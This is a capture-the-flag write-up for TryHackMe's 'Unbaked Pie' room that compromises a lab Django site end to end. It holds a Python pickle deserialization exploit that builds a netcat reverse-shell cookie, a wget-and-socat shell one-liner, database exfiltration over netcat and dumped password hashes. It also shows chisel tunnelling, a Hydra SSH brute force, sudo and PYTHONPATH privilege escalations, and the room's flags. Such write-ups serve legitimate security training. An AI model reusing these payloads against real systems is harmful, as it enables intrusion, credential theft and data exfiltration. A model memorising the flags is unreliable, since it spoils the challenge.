<h1 align="center">Unbaked Pie</h1>
<p align="center">July 24, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>444</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Don't over-baked your pie!</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/d890fb0e-d6a1-4543-a23b-ba6498d576df"><br>
Click <a href="https://tryhackme.com/room/unbakedpie">here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src=""></p>


<img width="1879" height="373" alt="image" src="https://github.com/user-attachments/assets/bb0fd327-e2d2-4528-9371-022c1586180c" />


<br>
<br>

<h2>Task 1 . Capture The Flag</h2>
<p>Please allow 5 minutes for this instance to fully deploy before attacking. This VM was developed in collaboration with @ch4rm, thanks to him for the foothold and privilege escalation ideas. </p>


<p><em>Answer the questions below</em></p>

<br>

<p>1.1. User Flag<br>
<code>____</code></p>

<br>

<p>1.2. Root Flag<br>
<code>____</code></p>

<h3>nmap</h3>

<p>

- <code>5003</code> : <code>filemaker?</code><br>
</p>

```bash
:~/UnbakedPie# nmap -sC -sV -Pn TargetIP
...
PORT     STATE SERVICE    VERSION
5003/tcp open  filemaker?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Fri, 25 Jul 2025 xx:xx:xx GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=gAyLhQzTTvGJSwxS5OaEE70fPwZOaupLbR2JDJ6OulMz4x7Ed6IaHiQFVIliIp9J; expires=Fri, 24 Jul 2026 xx:xx:xx GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|     <link href="/static/vendor/fontawesome-free/css/all.min.cs
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Fri, 25 Jul 2025 xx:xx:xx GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=XpDKgK4t5EJhpyFLqtYaseopDyj6CGISbyNrVnx0hl2B0PQImUYqJV448Vjx1CM1; expires=Fri, 24 Jul 2026 xx:xx:xx GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|_    <link href="/static/vendor/fontawesome-free/css/all.min.cs
```

<h3>/etc/hosts</h3>

```bash
TargetIP   unbaked.thm
```

<h3>Web</h3>
<p>

- Homemade Pickle<br>
- Pickle Pie<br>
- users: ramsey, wan, oliver
</p>

<img width="1130" height="179" alt="image" src="https://github.com/user-attachments/assets/f63a790d-3fbb-4e6f-b463-0bfb56599ab1" />

<img width="1133" height="642" alt="image" src="https://github.com/user-attachments/assets/2d49e2f8-0fc3-42da-8a51-48dadb82eaff" />

<h3>csrftoken</h3>

<img width="1127" height="514" alt="image" src="https://github.com/user-attachments/assets/f7a835d8-a985-44e0-a7bf-9db4780d4171" />

<h3>search_cookie</h3>

<img width="1125" height="102" alt="image" src="https://github.com/user-attachments/assets/f862711b-f17d-4bc1-90fa-ff6bd9b20528" />

<h3> Search = test > ls >  hell</h3>

<img width="1097" height="233" alt="image" src="https://github.com/user-attachments/assets/4a4f313a-4773-4947-a94c-dbc256386bc0" />

```bash
:~/UnbakedPie# echo 'gASVCAAAAAAAAACMBHRlc3SULg==' | base64 -d | xxd
00000000: 8004 9508 0000 0000 0000 008c 0474 6573  .............tes
00000010: 7494 2e                                  t..
:~/UnbakedPie# echo 'gASVBgAAAAAAAACMAmxzlC4=' | base64 -d | xxd
00000000: 8004 9506 0000 0000 0000 008c 026c 7394  .............ls.
00000010: 2e                                       .
:~/UnbakedPie# echo 'gASVCQAAAAAAAACMBWhlbGxvlC4=' | base64 -d | xxd
00000000: 8004 9509 0000 0000 0000 008c 0568 656c  .............hel
00000010: 6c6f 942e                                lo..
```



<img width="1103" height="525" alt="image" src="https://github.com/user-attachments/assets/bb7c8fd9-a54c-44ed-8202-0cb5a3b02669" />

<img width="1110" height="237" alt="image" src="https://github.com/user-attachments/assets/185f34e1-feef-4727-a488-04961bfdeed6" />

<img width="1107" height="512" alt="image" src="https://github.com/user-attachments/assets/309387d6-cca8-4693-a676-ef3577ede72f" />


<img width="1088" height="340" alt="image" src="https://github.com/user-attachments/assets/d5ff35fe-fdde-44f6-9b22-e470bbad3582" />

<img width="1129" height="403" alt="image" src="https://github.com/user-attachments/assets/2f4539b0-3a5c-409c-909a-0aff253f4703" />

<img width="1128" height="441" alt="image" src="https://github.com/user-attachments/assets/76475db7-71a2-4b5f-8164-05a0622e1aa2" />




<br>
<br>
<br>

<img width="906" height="333" alt="image" src="https://github.com/user-attachments/assets/8ce9a800-8bb2-4530-9e0a-044049c30586" />
<img width="906" height="438" alt="image" src="https://github.com/user-attachments/assets/52afe7f9-7d75-4627-94a2-b13aa200875a" />


<img width="903" height="319" alt="image" src="https://github.com/user-attachments/assets/afe63f60-ee27-487b-8b77-3bdba5a1f059" />

<img width="907" height="385" alt="image" src="https://github.com/user-attachments/assets/f199d118-cbcc-4943-9fb9-a7ce49fc708c" />

<img width="889" height="422" alt="image" src="https://github.com/user-attachments/assets/c844faac-eff9-41fc-80dc-28c57d3afdb5" />


return (os.system,("wget http://10.10.12.109/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.10.12.109:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane ",))



```bash
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.132.109 4444 > /tmp/f')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))


```


```bash
:~/UnbakedPie# python3 rev.py
b'gASVbAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFFybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xMzIuMTA5IDQ0NDQgPiAvdG1wL2aUhZRSlC4='
```

<p><em>Request</em></p>

```bash
POST /search HTTP/1.1
Host: unbaked.thm:5003
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://unbaked.thm:5003/search
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: http://unbaked.thm:5003
Connection:close
Cookie: csrftoken=2AjaPaX6os36jPKgUQ6SR8dQJzb812zqYKqAu8vsuLZXQJzrq5zPGjK5fbn4bhJy; search_cookie="gASVbAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFFybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xMzIuMTA5IDQ0NDQgPiAvdG1wL2aUhZRSlC4="
Upgrade-Insecure-Requests: 1

csrfmiddlewaretoken=LmD1IcRMWYxmCA0guV7OPMvntxPLuZAiHwKrnap82htd9uPr0aALEX2CZ91HEeKq&query=Hello
```

<p><em>Response</em></p>

```bash
root@ip-10-10-132-109:~/UnbakedPie# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.171.27 38694
/bin/sh: 0: can't access tty; job control turned off
# which python3
/usr/local/bin/python3
# python3 -c "import pty;pty.spawn('/bin/bash')"
root@8b39a559b296:/home# ^Z
[1]+  Stopped                 nc -nlvp 4444
root@ip-10-10-132-109:~/UnbakedPie# stty raw -echo; fg
nc -nlvp 4444

root@8b39a559b296:/home# cd /root
root@8b39a559b296:~# ls -lah
total 36K
drwx------ 1 root root 4.0K Oct  3  2020 .
drwxr-xr-x 1 root root 4.0K Oct  3  2020 ..
-rw------- 1 root root  889 Oct  6  2020 .bash_history
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root 4.0K Oct  3  2020 .cache
drwxr-xr-x 3 root root 4.0K Oct  3  2020 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw------- 1 root root    0 Sep 24  2020 .python_history
drwx------ 2 root root 4.0K Oct  3  2020 .ssh
-rw-r--r-- 1 root root  254 Oct  3  2020 .wget-hsts
root@8b39a559b296:~# getent hosts
127.0.0.1       localhost
127.0.0.1       localhost ip6-localhost ip6-loopback
172.17.0.2      8b39a559b296
root@8b39a559b296:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
root@8b39a559b296:~# ls -lah
total 36K
drwx------ 1 root root 4.0K Oct  3  2020 .
drwxr-xr-x 1 root root 4.0K Oct  3  2020 ..
-rw------- 1 root root  889 Oct  6  2020 .bash_history
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root 4.0K Oct  3  2020 .cache
drwxr-xr-x 3 root root 4.0K Oct  3  2020 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw------- 1 root root    0 Sep 24  2020 .python_history
drwx------ 2 root root 4.0K Oct  3  2020 .ssh
-rw-r--r-- 1 root root  254 Oct  3  2020 .wget-hsts
root@8b39a559b296:~# cat .bash_history
nc
exit
ifconfig
ip addr
ssh 172.17.0.1
ssh 172.17.0.2
exit
ssh ramsey@172.17.0.1
exit
cd /tmp
wget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh
chmod +x check-config.sh
./check-config.sh 
nano /etc/default/grub
vi /etc/default/grub
apt install vi
apt update
apt install vi
apt install vim
apt install nano
nano /etc/default/grub
grub-update
apt install grub-update
apt-get install --reinstall grub
grub-update
exit
ssh ramsey@172.17.0.1
exit
ssh ramsey@172.17.0.1
exit
ls
cd site/
ls
cd bakery/
ls
nano settings.py 
exit
ls
cd site/
ls
cd bakery/
nano settings.py 
exit
apt remove --purge ssh
ssh
apt remove --purge autoremove open-ssh*
apt remove --purge autoremove openssh=*
apt remove --purge autoremove openssh-*
ssh
apt autoremove openssh-client
clear
ssh
ssh
ssh
exit
root@8b39a559b296:/home# ls -lah
total 28K
drwxr-xr-x 1 root root 4.0K Oct  3  2020 .
drwxr-xr-x 1 root root 4.0K Oct  3  2020 ..
drwxrwxr-x 8 root root 4.0K Oct  3  2020 .git
drwxrwxr-x 2 root root 4.0K Oct  3  2020 .vscode
-rwxrwxr-x 1 root root   95 Oct  3  2020 requirements.sh
-rwxrwxr-x 1 root root   46 Oct  3  2020 run.sh
drwxrwxr-x 1 root root 4.0K Oct  3  2020 site
root@8b39a559b296:/home# ls -lah /
total 76K
drwxr-xr-x   1 root root 4.0K Oct  3  2020 .
drwxr-xr-x   1 root root 4.0K Oct  3  2020 ..
-rwxr-xr-x   1 root root    0 Oct  3  2020 .dockerenv
drwxr-xr-x   1 root root 4.0K Oct  3  2020 bin
drwxr-xr-x   2 root root 4.0K Jul 10  2020 boot
drwxr-xr-x   5 root root  340 Jul 25 15:13 dev
drwxr-xr-x   1 root root 4.0K Oct  5  2020 etc
drwxr-xr-x   1 root root 4.0K Oct  3  2020 home
drwxr-xr-x   1 root root 4.0K Oct  3  2020 lib
drwxr-xr-x   2 root root 4.0K Oct  3  2020 lib32
drwxr-xr-x   2 root root 4.0K Sep  8  2020 lib64
drwxr-xr-x   2 root root 4.0K Sep  8  2020 media
drwxr-xr-x   2 root root 4.0K Sep  8  2020 mnt
drwxr-xr-x   2 root root 4.0K Sep  8  2020 opt
dr-xr-xr-x 114 root root    0 Jul 25 15:13 proc
drwx------   1 root root 4.0K Oct  3  2020 root
drwxr-xr-x   3 root root 4.0K Sep  8  2020 run
drwxr-xr-x   1 root root 4.0K Oct  3  2020 sbin
drwxr-xr-x   2 root root 4.0K Sep  8  2020 srv
dr-xr-xr-x  13 root root    0 Jul 25 15:13 sys
drwxrwxrwt   1 root root 4.0K Jul 25 15:50 tmp
drwxr-xr-x   1 root root 4.0K Oct  3  2020 usr
drwxr-xr-x   1 root root 4.0K Sep  8  2020 var
root@8b39a559b296:/home# cd site
root@8b39a559b296:/home/site# ls -lah
total 184K
drwxrwxr-x 1 root root 4.0K Oct  3  2020 .
drwxr-xr-x 1 root root 4.0K Oct  3  2020 ..
drwxrwxr-x 1 root root 4.0K Oct  3  2020 account
drwxrwxr-x 8 root root 4.0K Oct  3  2020 assets
drwxrwxr-x 1 root root 4.0K Oct  3  2020 bakery
-rw-r--r-- 1 root root 148K Oct  3  2020 db.sqlite3
drwxrwxr-x 1 root root 4.0K Oct  3  2020 homepage
-rwxrwxr-x 1 root root  662 Oct  3  2020 manage.py
drwxrwxr-x 2 root root 4.0K Oct  3  2020 media
drwxrwxr-x 3 root root 4.0K Oct  3  2020 templates
root@8b39a559b296:/home/site# 
```


```bash
root@ip-10-10-132-109:~/UnbakedPie# nc -l -p 9999 > db.sqlite3
```

```bash
root@8b39a559b296:/home/site# nc -w 3 10.10.132.109 9999 < db.sqlite3
root@8b39a559b296:/home/site# 
```

```bash
root@ip-10-10-132-109:~/UnbakedPie# nc -l -p 9999 > db.sqlite3
root@ip-10-10-132-109:~/UnbakedPie# 
```


```bash
root@ip-10-10-132-109:~/UnbakedPie# sqlite3 db.sqlite3
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
auth_group                  django_admin_log          
auth_group_permissions      django_content_type       
auth_permission             django_migrations         
auth_user                   django_session            
auth_user_groups            homepage_article          
auth_user_user_permissions
sqlite> 

```

```bash
sqlite> select * from auth_user;
1|pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=|2020-10-03 10:43:47.229292|1|aniqfakhrul|||1|1|2020-10-02 04:50:52.424582|
11|pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=|2020-10-02 10:16:45.805533|0|testing|||0|1|2020-10-02 10:16:45.686339|
12|pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=|2020-10-03 10:44:10.758867|0|ramsey|||0|1|2020-10-02 14:42:44.388799|
13|pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=|2020-10-02 14:42:59.192571|0|oliver|||0|1|2020-10-02 14:42:59.113998|
14|pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=|2020-10-02 14:43:15.187554|0|wan|||0|1|2020-10-02 14:43:15.102863|
sqlite>
```

```bash
root@ip-10-10-132-109:~/UnbakedPie# nano ramsey_hash
root@ip-10-10-132-109:~/UnbakedPie# cat ramsey_hash
ramsey:pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik
```

<p>hash was not cracked</p>

```bash
:~/UnbakedPie# hashcat -m 10000 --username ramsey_hash /usr/share/wordlists/rockyou.txt
```

<br>

```bash
root@8b39a559b296:/home# nc -zv 172.17.0.1 1-65535
ip-172-17-0-1.eu-west-1.compute.internal [172.17.0.1] 5003 (?) open
ip-172-17-0-1.eu-west-1.compute.internal [172.17.0.1] 22 (ssh) open
```


<h3>Chisel</h3>

```bash
root@8b39a559b296:/home# wget http://10.10.132.109:8000/chisel
--2025-07-25 16:07:16--  http://10.10.132.109:8000/chisel
Connecting to 10.10.132.109:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8339456 (8.0M) [application/octet-stream]
Saving to: \u2018chisel\u2019

chisel              100%[===================>]   7.95M  --.-KB/s    in 0.07s   

2025-07-25 16:07:16 (115 MB/s) - \u2018chisel\u2019 saved [8339456/8339456]

root@8b39a559b296:/home# chmod +x chisel
```

```bash
root@ip-10-10-132-109:~/UnbakedPie# ./chisel server -p 2223 --reverse
2025/07/25 17:08:17 server: Reverse tunnelling enabled
2025/07/25 17:08:17 server: Fingerprint FaT4RmM5sqrO1Jf6/Sbfgw/CtwdK6vwDa7DYoU5qccw=
2025/07/25 17:08:17 server: Listening on http://0.0.0.0:2223
```

```bash
root@8b39a559b296:/home# /tmp/chisel client 10.10.132.109:2223 R:2222:172.17.1.0:22            
2025/07/25 16:12:45 client: Connecting to ws://10.10.132.109:2223
2025/07/25 16:12:45 client: Connected (Latency 877.333µs)

```


<h3>Hydra</h3>

```bash
root@ip-10-10-132-109:~/UnbakedPie# hydra -l 'ramsey' -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.1 -s 2222
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-25 17:14:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://172.17.0.1:2222/
[2222][ssh] host: 172.17.0.1   login: ramsey   password: 12345678
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-25 17:14:21
```


<h3>SSH</h3>

```bash
root@ip-10-10-132-109:~/UnbakedPie# ssh ramsey@172.17.0.1 -p 2222
The authenticity of host '[172.17.0.1]:2222 ([172.17.0.1]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Hec+oL7z07dkDWFMy7rs73U7+7HQdo+YtQO04CsFB1k.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[172.17.0.1]:2222' (ECDSA) to the list of known hosts.
ramsey@172.17.0.1's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


39 packages can be updated.
26 updates are security updates.


Last login: Tue Oct  6 22:39:31 2020 from 172.17.0.2
ramsey@unbaked:~$ pwd
/home/ramsey
ramsey@unbaked:~$ ls
payload.png  user.txt  vuln.py
ramsey@unbaked:~$ cat user.txt
THM{ce778dd41bec31e1daed77ebebcd7423}
```



```bash
ramsey@unbaked:~$ sudo -l
[sudo] password for ramsey: 
Matching Defaults entries for ramsey on unbaked:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ramsey may run the following commands on unbaked:
    (oliver) /usr/bin/python /home/ramsey/vuln.py
```



```bash
ramsey@unbaked:~$ cat /etc/passwd | grep '/bin/bash'
root:x:0:0:root:/root:/bin/bash
ramsey:x:1001:1001::/home/ramsey:/bin/bash
oliver:x:1002:1002::/home/oliver:/bin/bash
```


```bash
ramsey@unbaked:~$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:44917         0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::5003                 :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -     
```

```bash
ramsey@unbaked:~$ ls -lah
total 48K
drwxr-xr-x 5 ramsey ramsey 4.0K Oct  6  2020 .
drwxr-xr-x 4 root   root   4.0K Oct  3  2020 ..
-rw------- 1 root   root      1 Oct  5  2020 .bash_history
-rw-r--r-- 1 ramsey ramsey 3.7K Oct  3  2020 .bashrc
drwx------ 3 ramsey ramsey 4.0K Oct  3  2020 .cache
drwx------ 4 ramsey ramsey 4.0K Oct  3  2020 .local
drwxrwxr-x 2 ramsey ramsey 4.0K Oct  3  2020 .nano
-rwxrw-r-- 1 ramsey ramsey 1.7K Oct  3  2020 payload.png
-rw-r--r-- 1 ramsey ramsey  655 Oct  3  2020 .profile
-rw-r--r-- 1 root   root     38 Oct  6  2020 user.txt
-rw-r--r-- 1 root   ramsey 4.3K Oct  3  2020 vuln.py
```

```bash
ramsey@unbaked:~$ cat vuln.py

```


```bash
ramsey@unbaked:~$ sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
                                             
				      (
				       )
			          __..---..__
			      ,-='  /  |  \  `=-.
			     :--..___________..--;
	 		      \.,_____________,./
		 

\u2588\u2588\u2557\u2588\u2588\u2588\u2557   \u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2557   \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557
\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d
\u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551   \u2588\u2588\u2551   \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557
\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551   \u2588\u2588\u2551   \u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551
\u2588\u2588\u2551\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551   \u2588\u2588\u2551   \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551
\u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d   \u255a\u2550\u255d   \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d


			--------- WELCOME! ---------
			1. Calculator
			2. Easy Calculator
			3. Credits
			4. Exit
			----------------------------
			Enter Options >> 
```



```bash
ramsey@unbaked:~$ cat > /home/ramsey/vuln2.py << EOF
> #!/usr/bin/python
> import pty
> pty.spawn('/bin/bash')
> EOF
ramsey@unbaked:~$ mv vuln.py vuln.bak
ramsey@unbaked:~$ cp vuln2.py vuln.py 
ramsey@unbaked:~$ sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
oliver@unbaked:~$ id
uid=1002(oliver) gid=1002(oliver) groups=1002(oliver),1003(sysadmin)
oliver@unbaked:~$ pwd
/home/ramsey
oliver@unbaked:~$ cd ..
oliver@unbaked:/home$ cd oliver
oliver@unbaked:/home/oliver$ ls -lah
total 24K
drwxr-xr-x 3 oliver oliver 4.0K Oct  3  2020 .
drwxr-xr-x 4 root   root   4.0K Oct  3  2020 ..
-rw------- 1 root   root      1 Oct  5  2020 .bash_history
-rw-r--r-- 1 oliver oliver 3.7K Oct  3  2020 .bashrc
drwxrwxr-x 2 oliver oliver 4.0K Oct  3  2020 .nano
-rw-r--r-- 1 oliver oliver  655 Oct  3  2020 .profile
oliver@unbaked:/home/oliver$ sudo -l
Matching Defaults entries for oliver on unbaked:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User oliver may run the following commands on unbaked:
    (root) SETENV: NOPASSWD: /usr/bin/python /opt/dockerScript.py
oliver@unbaked:/home/oliver$ ls -l /opt/dockerScript.py 
-rwxr-x--- 1 root sysadmin 290 Oct  3  2020 /opt/dockerScript.py
oliver@unbaked:/home/oliver$ cat /opt/dockerScript.py 
import docker

# oliver, make sure to restart docker if it crashes or anything happened.
# i havent setup swap memory for it
# it is still in development, please dont let it live yet!!!
client = docker.from_env()
client.containers.run("python-django:latest", "sleep infinity", detach=True)
oliver@unbaked:/home/oliver$ cat > /home/oliver/docker.py << EOF
> import pty
> pty.spawn('/bin/bash')
> EOF
ockerScript.py:/home/oliver$ sudo PYTHONPATH=/home/oliver /usr/bin/python /opt/d 
root@unbaked:/home/oliver# id
uid=0(root) gid=0(root) groups=0(root)
root@unbaked:/home/oliver# cat /root/root.txt
CONGRATS ON PWNING THIS BOX!
Created by ch4rm & H0j3n
ps: dont be mad us, we hope you learn something new

flag: THM{1ff4c893b3d8830c1e188a3728e90a5f}
root@unbaked:/home/oliver# 
```



<img width="1904" height="871" alt="image" src="https://github.com/user-attachments/assets/2c5e4f1b-4f52-4a3c-a1d5-a074d77471fd" />

<img width="1894" height="892" alt="image" src="https://github.com/user-attachments/assets/30bd50f2-5a91-4090-a453-a680e071c523" />




<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/e63c86cb-6d97-4ffe-a7bc-093250ca02cc" />

<img width="1889" height="890" alt="image" src="https://github.com/user-attachments/assets/8a31776b-9c5e-4475-849b-edab230865f7" />

<img width="1892" height="891" alt="image" src="https://github.com/user-attachments/assets/3f83eeef-f925-4b26-a7d9-dc4052519b04" />

187

<img width="1895" height="903" alt="image" src="https://github.com/user-attachments/assets/cfd72dee-2591-4f0f-ba85-83f2e88c4d88" />


<img width="1889" height="887" alt="image" src="https://github.com/user-attachments/assets/8b731e3c-95d6-48c2-8428-6ad7c4312e4c" />






